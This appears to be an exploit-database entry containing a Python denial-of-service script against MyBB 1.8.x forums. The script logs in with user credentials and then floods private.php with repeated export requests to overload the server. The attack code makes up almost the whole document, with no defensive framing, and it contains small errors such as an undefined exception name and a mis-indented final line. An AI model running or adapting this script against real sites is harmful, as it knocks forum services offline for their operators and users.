@@ -1,0 +1,146 @@
+id: 30344
+date: 05/13/2018
+title: MyBB 1.8.x Denial of Service Exploit
+author: batininhani
+cves: 
+
+#!/usr/bin/env python3
+import sys
+import requests
+import argparse
+import random
+import time
+
+
+def main(argv):
+    global target, user, password
+    parser = argparse.ArgumentParser(
+        description='MyBB Denial of Service Attack - 1.8.x')
+    parser.add_argument('-t', '--target', help='target url', required=True)
+    parser.add_argument('-p', '--password', help='password', required=True)
+    parser.add_argument('-u', '--user', help='user', required=True)
+    args = parser.parse_args()
+
+    target = args.target
+    user = args.user
+    password = args.password
+
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+
+try:
+    r0 = requests.get(target + 'inc/init.php')
+
+except (requests.ConnectionError,requests.ConnectTimeout) as error:
+
+    print("Target is not MyBB!")
+    sys.exit()
+
+print("Target is MyBB!")
+
+url0 = target + 'member.php'
+
+payload = {'action': 'do_login', 'url': target, 'quick_login': '1', 'quick_username' : user, 'quick_password' : password, 'submit' : 'Login'}
+
+session = requests.session()
+
+r0_1 = session.post(url0, data=payload)
+
+with r0_1 as login:
+
+    if "<!-- end: redirect -->" not in login.text:
+
+        sys.exit("Login Failed! or may CAPTCHA")
+
+
+mypostkey = input('Input Post Key -> ')
+
+try:
+
+    if mypostkey != int(mypostkey):
+
+        time.sleep(2)
+
+        print("OK..")
+
+except ValueError:
+
+    sys.exit("Wrong POST Key!")
+
+
+value = input('Max number of concurrent HTTP(s) requests -> ')
+
+try:
+
+    intvalue = random.randint(1000000, int(value)*123456789)
+
+except ValueError:
+
+    sys.exit("Input Integer Value!")
+
+url1 = target + 'private.php'
+
+payload1 = {'my_post_key': mypostkey, 'pmid': intvalue, 'action': 'do_export'}
+
+cookies = r0_1.cookies.get_dict()
+
+def request():
+
+    r1 = requests.post(url1, data=payload1, cookies=cookies)
+
+    return r1
+
+
+def exploit():
+
+    global value
+
+    value = int(value)
+
+    while True:
+
+        if value > 0:
+
+            print("exploit running..")
+
+            try:
+
+                request()
+
+            except error:
+
+                sys.exit("Request Timed Out!")
+
+            value = value - 1
+
+        else:
+
+            sys.exit("Done!")
+
+
+sta_code = request().status_code
+
+if sta_code != 503:
+
+    sys.exit("Opps.. :(")
+
+else:
+
+    print("Vuln Found!!")
+
+    time.sleep(2)
+
+    print("There we goo!..\n")
+
+    print("exploit running.. | value ->", intvalue)
+
+    try:
+
+        exploit()
+
+    except KeyboardInterrupt as error2:
+
+sys.exit("\nExiting..")
+
+#  0day.today [2023-03-22]  #
